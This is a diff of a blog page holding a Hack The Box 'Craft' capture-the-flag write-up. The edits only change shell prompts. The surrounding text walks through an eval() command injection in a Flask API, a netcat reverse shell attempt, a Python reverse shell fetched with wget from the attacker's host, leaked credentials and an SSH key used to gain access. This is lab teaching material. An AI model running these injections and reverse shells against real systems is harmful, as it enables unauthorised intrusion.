@@ -8,9 +8,9 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <meta name="description" content="Craft was a not so straight forward box, mainly based on little configuration mistakes rather than exploits. Which makes it more interesting in my opinion. I learned a few tricks on this one.
 First thing first, let&amp;rsquo;s add the box IP to the hosts file:
-$ echo &amp;#34;10.10.10.110 craft.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts and let&amp;rsquo;s start!
+[hg8@archbook ~]$ echo &amp;#34;10.10.10.110 craft.htb&amp;#34; &amp;gt;&amp;gt; /etc/hosts and let&amp;rsquo;s start!
 User Flag Recon Let&amp;rsquo;s start with the classic nmap scan:
-$ nmap -sV -sT -sC craft.htb Starting Nmap 7."/>
+[hg8@archbook ~]$ nmap -sV -sT -sC craft."/>
 <meta name="keywords" content="hackthebox, ctf, craft"/>
 <meta name="robots" content="noodp"/>
 <link rel="canonical" href="/posts/craft/" />
@@ -191,12 +191,12 @@ $ nmap -sV -sT -sC craft.htb Starting Nmap 7."/>
     <div class="post-content">
       <p>Craft was a not so straight forward box, mainly based on little configuration mistakes rather than exploits. Which makes it more interesting in my opinion. I learned a few tricks on this one.</p>
 <p>First thing first, let&rsquo;s add the box IP to the hosts file:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;10.10.10.110 craft.htb&#34;</span> &gt;&gt; /etc/hosts
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;10.10.10.110 craft.htb&#34;</span> &gt;&gt; /etc/hosts
 </code></pre></div><p>and let&rsquo;s start!</p>
 <h1 id="user-flag">User Flag</h1>
 <h2 id="recon">Recon</h2>
 <p>Let&rsquo;s start with the classic nmap scan:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nmap -sV -sT -sC craft.htb
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nmap -sV -sT -sC craft.htb
 Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2019-10-20 01:26 CEST
 Nmap scan report <span style="color:#66d9ef">for</span> craft.htb <span style="color:#f92672">(</span>10.10.10.110<span style="color:#f92672">)</span>
 Host is up <span style="color:#f92672">(</span>0.048s latency<span style="color:#f92672">)</span>.
@@ -216,8 +216,8 @@ Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</spa
 <li>An api is running and it&rsquo;s documentation available at <a href="https://api.craft.htb/api/">https://api.craft.htb/api/</a></li>
 </ul>
 <p>We need to add those two in our <code>/etc/hosts/</code> file to be able to access it :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;10.10.10.110 gogs.craft.htb&#34;</span> &gt;&gt; /etc/hosts
-$ echo <span style="color:#e6db74">&#34;10.10.10.110 api.craft.htb&#34;</span> &gt;&gt; /etc/hosts
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;10.10.10.110 gogs.craft.htb&#34;</span> &gt;&gt; /etc/hosts
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ echo <span style="color:#e6db74">&#34;10.10.10.110 api.craft.htb&#34;</span> &gt;&gt; /etc/hosts
 </code></pre></div><p>Following this, <code>gogs.craft.htb</code> displays:</p>
 <p><img src="https://user-images.githubusercontent.com/9076747/67158918-b8797400-f33e-11e9-9223-2ac64d958595.png" alt="Gogs instance Craft website"></p>
 <p>and <code>api.craft.htb</code> displays:</p>
@@ -240,13 +240,13 @@ $ echo <span style="color:#e6db74">&#34;10.10.10.110 api.craft.htb&#34;</span> &
 <p>This confirms that our entry point will probably be the api. Let&rsquo;s investigate.</p>
 <p>Since we have the code source it will greatly help our investigation. The API is in Python with the Flask framework.</p>
 <p>Let&rsquo;s clone it to check the code more easily :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ GIT_SSL_NO_VERIFY<span style="color:#f92672">=</span>true git clone https://gogs.craft.htb/Craft/craft-api.git
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ GIT_SSL_NO_VERIFY<span style="color:#f92672">=</span>true git clone https://gogs.craft.htb/Craft/craft-api.git
 </code></pre></div><h2 id="remote-code-execution-on-api">Remote code execution on API</h2>
 <p>The first thing I do when doing static code analysis is checking if dangerous functions are used and can be used for command injection. It&rsquo;s the easiest way to land a shell on a box.
 If this search don&rsquo;t give any results I will move on to SQL injection and so on.</p>
 <p>The most common way command injection vulnerability get introduced in Python is by the <code>eval()</code> function which is used to run the python code (which is passed as an argument) within the program.</p>
 <p>A quick <code>grep</code> will tell us if such function is used within the API:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ grep -ri <span style="color:#e6db74">&#34;eval&#34;</span> craft-api
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ grep -ri <span style="color:#e6db74">&#34;eval&#34;</span> craft-api
 craft-api/craft_api/api/brew/endpoints/brew.py:        <span style="color:#66d9ef">if</span> eval<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;%s &gt; 1&#39;</span> % request.json<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;abv&#39;</span><span style="color:#f92672">])</span>:
 </code></pre></div><p>We are lucky, and just by the look of the line it seems like no sanitization is done and the <code>abv</code> request parameter is directly run through <code>eval()</code>.</p>
 <p>Reading through the code of <code>brew.py</code> confirm the suspicion:</p>
@@ -270,9 +270,9 @@ craft-api/craft_api/api/brew/endpoints/brew.py:        <span style="color:#66d9e
 <p>Since there is only 6 commits in history we can manually review them to make sure we don&rsquo;t forget anything. At commit <code>a2d28ed155</code> we find an interesting cleanup:</p>
 <p><img src="https://user-images.githubusercontent.com/9076747/67160472-668e1980-f351-11e9-8cb2-f2f49bae0833.png" alt="Commit cleanup"></p>
 <p>Let&rsquo;s try to use those credentials to authenticate to the API:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ curl <span style="color:#e6db74">&#34;https://api.craft.htb/api/auth/login&#34;</span> -k --user dinesh:4aUh0A8PbVJxgd
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ curl <span style="color:#e6db74">&#34;https://api.craft.htb/api/auth/login&#34;</span> -k --user dinesh:4aUh0A8PbVJxgd
 <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;token&#34;</span>:<span style="color:#e6db74">&#34;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE&#34;</span><span style="color:#f92672">}</span>
-$ curl -H <span style="color:#e6db74">&#34;X-Craft-Api-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE&#34;</span>  <span style="color:#e6db74">&#34;https://api.craft.htb/api/auth/check&#34;</span> -k
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ curl -H <span style="color:#e6db74">&#34;X-Craft-Api-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiZGluZXNoIiwiZXhwIjoxNTcxNTc5ODMwfQ.JpQJlqqc_pYA6Pd3ILx4zDOaXSPYwJ6yMELyIWXDDCE&#34;</span>  <span style="color:#e6db74">&#34;https://api.craft.htb/api/auth/check&#34;</span> -k
 <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>
 </code></pre></div><p>We are authenticated! Note here that this API doesn&rsquo;t use the usual <code>Authorization: Bearer &lt;token&gt;</code> header but a custom header in the format <code>X-Craft-Api-Token: &lt;token&gt;</code>. It can be easy to overlook this one, that&rsquo;s why taking time to read the code and understanding the inner workings of the app is important.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e"># craft_api/api/auth/endpoints/auth.py</span>
@@ -320,7 +320,7 @@ response <span style="color:#f92672">=</span> requests<span style="color:#f92672
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">[<span style="color:#f92672">...</span>]
 <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Execution time: {}&#34;</span><span style="color:#f92672">.</span>format(response<span style="color:#f92672">.</span>elapsed<span style="color:#f92672">.</span>total_seconds()))
 </code></pre></div><p>Let&rsquo;s it give a try:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python test.py
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python test.py
 <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>
 
 &gt; test
@@ -333,7 +333,7 @@ Execution time: 5.158874
 </span><span style="color:#f92672"></span><span style="color:#a6e22e">+ brew_dict[&#39;abv&#39;] = &#39;__import__(&#34;os&#34;).popen(&#34;{} &amp;&amp; sleep 3&#34;).read()&#39;.format(cmd)
 </span></code></pre></div><p>The usage of <code>&amp;&amp; sleep 3</code> means that the sleep command will only get executed if the first command succeeded. This technique will allow us to blindly learn about the box environment.</p>
 <p>Here is an example to illustrate:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python test.py
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python test.py
 <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>
 
 &gt; curl --help
@@ -343,10 +343,10 @@ Execution time: 3.160078
 </code></pre></div><p>Since <code>wget --help</code> command took 3 seconds to execute this means that the command run fine. While <code>curl --help</code> failed, the <code>sleep 3</code> didn&rsquo;t start meaning <code>curl</code> is not probably not installed.</p>
 <p>This little trick will allow us to have a valuable feedback to know if our command succeed or fail.</p>
 <p>Let&rsquo;s try to open our classic reverse shell. Start with our listener:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
 Listening on any address <span style="color:#ae81ff">8585</span>
 </code></pre></div><p>And launch our test script on the API:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python test.py
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python test.py
 <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>
 
 &gt; nc -e /bin/sh 10.10.10.85 <span style="color:#ae81ff">8585</span>
@@ -356,7 +356,7 @@ Execution time: 4.412322
 &gt;
 </code></pre></div><p>Oddly enough this is not working, whereas <code>nc</code> seems to be installed. That&rsquo;s strange but let&rsquo;s move on to a different type of reverse shell. Since we know for sure that python is installed let&rsquo;s use a python reverse shell.</p>
 <p>To make things easier let&rsquo;s launch a small http server to host our python reverse shell file:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat hg8.py
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ cat hg8.py
 import socket,subprocess,os;
 s<span style="color:#f92672">=</span>socket.socket<span style="color:#f92672">(</span>socket.AF_INET,socket.SOCK_STREAM<span style="color:#f92672">)</span>;
 s.connect<span style="color:#f92672">((</span><span style="color:#e6db74">&#34;10.10.10.85&#34;</span>,8585<span style="color:#f92672">))</span>;
@@ -364,17 +364,17 @@ os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">(
 os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">()</span>,1<span style="color:#f92672">)</span>;
 os.dup2<span style="color:#f92672">(</span>s.fileno<span style="color:#f92672">()</span>,2<span style="color:#f92672">)</span>;
 p<span style="color:#f92672">=</span>subprocess.call<span style="color:#f92672">([</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>,<span style="color:#e6db74">&#34;-i&#34;</span><span style="color:#f92672">])</span>;
-$ python -m http.server
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python -m http.server
 Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> <span style="color:#f92672">(</span>http://0.0.0.0:8000/<span style="color:#f92672">)</span> ...
 </code></pre></div><p>And back to our original terminal let&rsquo;s launch our injection:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ python test.py
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ python test.py
 <span style="color:#f92672">{</span><span style="color:#e6db74">&#34;message&#34;</span>:<span style="color:#e6db74">&#34;Token is valid!&#34;</span><span style="color:#f92672">}</span>
 
 wget 10.10.10.85:8000/hg8.py -O /tmp/hg8.py
 Execution time: 1.15602
 &gt; python /tmp/hg8.py
 </code></pre></div><p>And surely enough a connection open on our netcat listener:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ nc -l -vv -p <span style="color:#ae81ff">8585</span>
 Listening on any address <span style="color:#ae81ff">8585</span>
 Connection from 10.10.10.110:57154
 /opt/app <span style="color:#75715e"># id</span>
@@ -449,10 +449,10 @@ connection <span style="color:#f92672">=</span> pymysql<span style="color:#f9267
 <p>So what remains is to go back to the Gogs instance. Login as <code>gilfoyle</code> gives us access to a very interesting private repository:</p>
 <p><img src="https://user-images.githubusercontent.com/9076747/67162678-94318d80-f366-11e9-9377-04c310d8654a.png" alt="Craft Infra Repository"></p>
 <p>Let&rsquo;s clone it to explore it :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ GIT_SSL_NO_VERIFY<span style="color:#f92672">=</span>true git clone https://gilfoyle:ZEU3N8WNM2rh4T@gogs.craft.htb/gilfoyle/craft-infra.git
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ GIT_SSL_NO_VERIFY<span style="color:#f92672">=</span>true git clone https://gilfoyle:ZEU3N8WNM2rh4T@gogs.craft.htb/gilfoyle/craft-infra.git
 </code></pre></div><p>First thing that catches the eye is the <code>.ssh</code> folder containing both the public and private key. We should be able to use to login as <code>gilfoyle</code> through SSH:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ chmod <span style="color:#ae81ff">600</span> .ssh/id_rsa
-$ ssh gilfoyle@craft.htb -i id_rsa
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ chmod <span style="color:#ae81ff">600</span> .ssh/id_rsa
+<span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh gilfoyle@craft.htb -i id_rsa
 
   .   *   ..  . *  *
 *  * @<span style="color:#f92672">()</span>Ooc<span style="color:#f92672">()</span>*   o  .
@@ -537,7 +537,7 @@ key_type           otp
 port               <span style="color:#ae81ff">22</span>
 username           root
 </code></pre></div><p>Seems like everything went fine. Let&rsquo;s launch a new terminal and try to login as <code>root</code> :</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ssh root@craft.htb
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>hg8@archbook ~<span style="color:#f92672">]</span>$ ssh root@craft.htb
 
   .   *   ..  . *  *
 *  * @<span style="color:#f92672">()</span>Ooc<span style="color:#f92672">()</span>*   o  .
